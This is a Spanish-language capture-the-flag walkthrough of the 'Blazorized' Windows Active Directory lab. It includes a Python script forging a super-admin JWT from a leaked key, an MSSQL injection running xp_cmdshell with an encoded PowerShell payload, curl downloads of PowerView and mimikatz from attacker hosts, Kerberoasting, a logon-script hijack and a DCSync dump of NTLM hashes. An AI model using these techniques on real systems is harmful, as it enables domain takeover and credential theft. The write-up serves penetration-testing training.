#ActiveDirectory #medium #windows 
### Ping

```python
ping -c 1 10.10.11.22
PING 10.10.11.22 (10.10.11.22) 56(84) bytes of data.
64 bytes from 10.10.11.22: icmp_seq=1 ttl=127 time=366 ms

--- 10.10.11.22 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 365.816/365.816/365.816/0.000 ms
```

### TTL = 127 - Windows

### nmap

```python
Not shown: 65514 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://blazorized.htb
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1115.00; RC0+
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-07-05T02:37:01
|_Not valid after:  2054-07-05T02:37:01
|_ssl-date: 2024-07-05T02:41:11+00:00; -1s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.11.22\BLAZORIZED: 
|     Target_Name: BLAZORIZED
|     NetBIOS_Domain_Name: BLAZORIZED
|     NetBIOS_Computer_Name: DC1
|     DNS_Domain_Name: blazorized.htb
|     DNS_Computer_Name: DC1.blazorized.htb
|     DNS_Tree_Name: blazorized.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.11.22\BLAZORIZED: 
|     Instance name: BLAZORIZED
|     Version: 
|       name: Microsoft SQL Server 2022 RC0+
|       number: 16.00.1115.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RC0
|       Post-SP patches applied: true
|     TCP port: 1433
|_    Clustered: false
3268/tcp  open  tcpwrapped
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49776/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1115.00; RC0+
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-07-05T02:37:01
|_Not valid after:  2054-07-05T02:37:01
|_ssl-date: 2024-07-05T02:41:11+00:00; -1s from scanner time.
| ms-sql-info: 
|   10.10.11.22:49776: 
|     Version: 
|       name: Microsoft SQL Server 2022 RC0+
|       number: 16.00.1115.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RC0
|       Post-SP patches applied: true
|_    TCP port: 49776
| ms-sql-ntlm-info: 
|   10.10.11.22:49776: 
|     Target_Name: BLAZORIZED
|     NetBIOS_Domain_Name: BLAZORIZED
|     NetBIOS_Computer_Name: DC1
|     DNS_Domain_Name: blazorized.htb
|     DNS_Computer_Name: DC1.blazorized.htb
|     DNS_Tree_Name: blazorized.htb
|_    Product_Version: 10.0.17763
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-07-05T02:41:03
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.66 seconds
```

### Enumeración del puerto 80 (http)
en la enumeración web podemos ver blazorized
![[Pasted image 20240704224625.png]]

`api`
al intentar enumerar la web en busca de subdominios podemos ver que al hacer clic en `Check for Updates` podemos ver que esta haciendo referencia a una `api` determinada
![[Pasted image 20240704225000.png]]

`/etc/hosts`
agregamos estas rutas a nuestro archivo `hosts` para poder enumerarlas
![[Pasted image 20240704225228.png]]

### XSS en blazorized
otra cosa que conseguí fue una `CVE` [XXS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/xss-in-markdown) he intentado esto pero no he podido conseguir mucha cosa. esperaba obtener una cookie o algo pero por el momento no tenemos nada
![[Pasted image 20240704225640.png]]

### Fuzzing con wfuzz
conseguí el subdominio de `admin` así que lo vamos a agregar el archivo `hosts` para seguir enumerando
![[Pasted image 20240704230120.png]]

### Enumeración del puerto 80 (http)
después de intentar un montón de cosas aquí no tenemos aun un vector claro
![[Pasted image 20240704230403.png]]

`Archivos DLL interesantes del marco Blazor`
Una cosa interesante de este sitio web fue la gran cantidad de archivos DLL. Después de un tiempo probando sttuf, decidí descargar algunas DLL para probar ingeniería inversa. 
![[Pasted image 20240704231037.png]]

`Descargué Blazorized.Helpers.dll desde` [aqui](http://blazorized.htb/_framework/Blazorized.Helpers.dll) 
![[Pasted image 20240704234037.png]]

### dnSpy
para este paso vamos a necesitar una maquina Windows ya que la herramienta dnSpy es para Windows. sin embargo existen maneras de usarla en Kali. puedes investigar esta opción
![[Pasted image 20240705003628.png]]

`Token`
con esta información podremos crear nuestro propio token para acceder como Administrador en blazorized. Puedes usar jwt.io, o en mi caso hice un script en Python:
![[Pasted image 20240705003707.png]]
![[Pasted image 20240705003826.png]]

### script
con este script usando la sintax que hemos obtenido del análisis de los DLL podemos generar un nuevo token
```python
import jwt
import datetime
import pytz

# Created by 3ky, enjoy :)
jwtSymmetricSecurityKey = "8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d96cc4d08519e185d14727ca18728bf1efcde454eea6f65b8d466a4fb6550d5c795d9d9176ea6cf021ef9fa21ffc25ac40ed80f4a4473fc1ed10e69eaf957cfc4c67057e547fadfca95697242a2ffb21461e7f554caa4ab7db07d2d897e7dfbe2c0abbaf27f215c0ac51742c7fd58c3cbb89e55ebb4d96c8ab4234f2328e43e095c0f55f79704c49f07d5890236fe6b4fb50dcd770e0936a183d36e4d544dd4e9a40f5ccf6d471bc7f2e53376893ee7c699f48ef392b382839a845394b6b93a5179d33db24a2963f4ab0722c9bb15d361a34350a002de648f13ad8620750495bff687aa6e2f298429d6c12371be19b0daa77d40214cd6598f595712a952c20eddaae76a28d89fb15fa7c677d336e44e9642634f32a0127a5bee80838f435f163ee9b61a67e9fb2f178a0c7c96f160687e7626497115777b80b7b8133cef9a661892c1682ea2f67dd8f8993c87c8c9c32e093d2ade80464097e6e2d8cf1ff32bdbcd3dfd24ec4134fef2c544c75d5830285f55a34a525c7fad4b4fe8d2f11af289a1003a7034070c487a18602421988b74cc40eed4ee3d4c1bb747ae922c0b49fa770ff510726a4ea3ed5f8bf0b8f5e1684fb1bccb6494ea6cc2d73267f6517d2090af74ceded8c1cd32f3617f0da00bf1959d248e48912b26c3f574a1912ef1fcc2e77a28b53d0a"
issuer = "http://api.blazorized.htb"
apiAudience = "http://api.blazorized.htb"
adminDashboardAudience = "http://admin.blazorized.htb"
superAdminEmailClaimValue = "superadmin@blazorized.htb"
superAdminRoleClaimValue = "Super_Admin"

def get_signing_credentials() -> str:
    try:
        return jwtSymmetricSecurityKey
    except Exception as e:
        raise e

def generate_super_admin_jwt(expiration_duration_in_seconds: int = 60) -> str:
    try:
        claims = {
            "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress": superAdminEmailClaimValue,
            "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": superAdminRoleClaimValue,
            "iss": issuer,
            "aud": adminDashboardAudience,
            "exp": datetime.datetime.now(pytz.utc) + datetime.timedelta(seconds=expiration_duration_in_seconds)
        }
        key = get_signing_credentials()
        jwt_token = jwt.encode(claims, key, algorithm="HS512")
        return jwt_token
    except Exception as e:
        raise e

if __name__ == "__main__":
    token = generate_super_admin_jwt()
    print(token)

```

`token`
![[Pasted image 20240705123825.png]]

### the super admin panel
cuando ya tenemos el token que hemos generado simplemente vamos a `Storage > Local Storage` en la key el valor debe ser `jwt` y el `value` el valor del token 
![[Pasted image 20240705133401.png]]

`SQLI`
podemos encontrar `XSS` y `SQLi`  panel de administración, y sabemos que este es un objetivo de `AD`, por lo que, por supuesto, están usando `MSSQLSERVER` esto significa que podemos intentar ejecutar `xp_cmdshell` y obtener nuestro primer shell.
![[Pasted image 20240705134002.png]]

### Vulnerabilidades

| CVE-XXXX-XXXXX              | Nombre de la vulnerabilidad                                                 | Tipo | Nivel | Link                                                                                                                                 |
| --------------------------- | --------------------------------------------------------------------------- | ---- | ----- | ------------------------------------------------------------------------------------------------------------------------------------ |
| **CVE-2015-3295**           | Through Markdown Formatted Content Vulnerability in the markdown-it library | XXS  | 5.7   | [Link](https://sca.analysiscenter.veracode.com/vulnerability-database/security/cross-site-scripting-xss-through/javascript/sid-1590) |
| **Payloads All The Things** | MSSQL Injection                                                             |      |       | [Link](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/MSSQL%20Injection/)                                        |
|                             |                                                                             |      |       |                                                                                                                                      |

### SQLI reverse shell
aprovecharemos `SQLI` para ejecutar nuestro payload

```python
3'; use master; exec xp_cmdshell 'powershell -e TuPayloadAqui';-- -
```

![[Pasted image 20240705144840.png]]

`shell`
obtenemos una conexión como el usuario `nu_1055`
![[Pasted image 20240705145114.png]]

### Enumeración del sistema
por el momento no parece tener algún permiso que podamos explotar así que seguiremos enumerando 
![[Pasted image 20240705145815.png]]

`Sharphound - PSUpload`
vamos a cargar estas dos herramientas para poder enumerar el sistema y luego enviarnos esa información a nuestra maquina
![[Pasted image 20240705145749.png]]

`Sharphound`
ejecutamos el sharphound.exe para obtener el grafico del AD
![[Pasted image 20240705152513.png]]

### python3 -m uploadserver
estaremos a la escucha con un servidor de python para poder capturar esta petición
![[Pasted image 20240705231325.png]]

### Import-Module
ahora usando el script PSUpload vamos a enviar el archivo que necesitamos al servidor que tenemos en escucha para poder analizarlo en local
![[Pasted image 20240705231437.png]]

### BloodHound
podemos ver que el usuario que hemos comprometido esta relacionado con el usuario `RSA_4810` y directamente con el dominio
![[Pasted image 20240707004741.png]]

### Ataque SPN (Service Principal Name)
primero vamos a subir el script PowerView.ps1 a la maquina atacante para poder usarlo e intentar explotar este servicio sobre el usuario `RSA_4810`

```python
curl 10.10.14.6:80/PowerView.ps1 -o PowerView.ps1
--------------------------------------------------------------------------------------------------------------------------------------
Import-Module .\PowerView.ps1
#Check if RSA_4810 has not SPN
Get-DomainUser 'RSA_4810' | Select serviceprincipalname
#Set SPN
setspn -A http/RSA_4810 BLAZORIZED\RSA_4810
$User = Get-DomainUser 'RSA_4810'
$User | Get-DomainSPNTicket | fl
```

de esta manera podemos obtener un hash NTLM de kerberos que intentaremos descifrar con John the Ripper
![[Pasted image 20240707005833.png]]

### jhon
vamos a descifrar el hash con John para ver si podemos obtener una contraseña en texto plano
![[Pasted image 20240707010527.png]]

### Accediendo como RSA_4810
usamos las credenciales que hemos obtenido con el usuario y vamos a ingresar con la herramienta `evil-winrm`
![[Pasted image 20240707010748.png]]

### acceso a SSA_6010
nuestro último objetivo es obtener acceso al usuario `SSA_6010` para esto usaremos nuevamente PowerView.ps1

```python
curl 10.10.14.2:80/PowerView.ps1 -o PowerView.ps1
Import-Module .\PowerView.ps1
Get-DomainObject -Identity SSA_6010
```

Lo interesante aquí es el scriptpath, y necesitamos descubrir cómo leer ese archivo
![[Pasted image 20240707011706.png]]

### smbclient
vamos a enumerar los recursos compartidos para identificar lo que hay en la ruta.
![[Pasted image 20240707013331.png]]

aquí tenemos un archivo `2C0A3DFE2030.bat` y lo descargamos con un `get`
![[Pasted image 20240707014111.png]]

`cat`
después de mucha investigación y lectura de la documentación de Microsoft, podemos cambiar ScriptPath

```python
Set-DomainObject -Identity SSA_6010 -Set @{ScriptPath='C:\Windows\tasks\script.bat'}
```

Los scripts de inicio de sesión locales deben almacenarse en una carpeta compartida que utilice el nombre compartido de Netlogon o
almacenarse en subcarpetas de la carpeta Netlogon [Info](https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/assign-logon-script-profile-local-user)
![[Pasted image 20240707014207.png]]
\
Así que necesitamos descubrir cómo usar el mismo archivo bat, pero hay un problema. no tenemos suficientes permisos

```python
curl 10.10.14.54:80/mimikatz.exe -o mimikatz.exe
.\mimikatz.exe lsadump::dcsync /domain:blazorized.htb /user:Administrator > output.txt

--------------------------------------------------------------------------------------------------------------------------------------

mimikatz # lsadump::dcsync /domain:blazorized.htb /user:Administrator
[DC] 'blazorized.htb' will be the domain
[DC] 'DC1.blazorized.htb' will be the DC server
[DC] 'Administrator' will be the user account
Object RDN : Administrator
** SAM ACCOUNT **
SAM Username : Administrator
Account Type : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration :
Password last change : 2/25/2024 12:54:43 PM
Object Security ID : S-1-5-21-2039403211-964143010-2924010611-500
Object Relative ID : 500
Credentials:
Hash NTLM: f55ed1465179ba374ec1cad05b34a5f3
ntlm- 0: f55ed1465179ba374ec1cad05b34a5f3
ntlm- 1: eecc741ecf81836dcd6128f5c93313f2
ntlm- 2: c543bf260df887c25dd5fbacff7dcfb3
ntlm- 3: c6e7b0a59bf74718bce79c23708a24ff
ntlm- 4: fe57c7727f7c2549dd886159dff0d88a
ntlm- 5: b471c416c10615448c82a2cbb731efcb
ntlm- 6: b471c416c10615448c82a2cbb731efcb
ntlm- 7: aec132eaeee536a173e40572e8aad961
ntlm- 8: f83afb01d9b44ab9842d9c70d8d2440a
ntlm- 9: bdaffbfe64f1fc646a3353be1c2c3c99
lm - 0: ad37753b9f78b6b98ec3bb65e5995c73
lm - 1: c449777ea9b0cd7e6b96dd8c780c98f0
Access as Administrator and get root flag.
PWNNET TEAM
writted by 3ky
lm - 2: ebbe34c80ab8762fa51e04bc1cd0e426
lm - 3: 471ac07583666ccff8700529021e4c9f
lm - 4: ab4d5d93532cf6ad37a3f0247db1162f
lm - 5: ece3bdafb6211176312c1db3d723ede8
lm - 6: 1ccc6a1cd3c3e26da901a8946e79a3a5
lm - 7: 8b3c1950099a9d59693858c00f43edaf
lm - 8: a14ac624559928405ef99077ecb497ba
Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
Random Value : 36ff197ab8f852956e4dcbbe85e38e17
```

### Acceso Administrador

![[Pasted image 20240707020641.png]]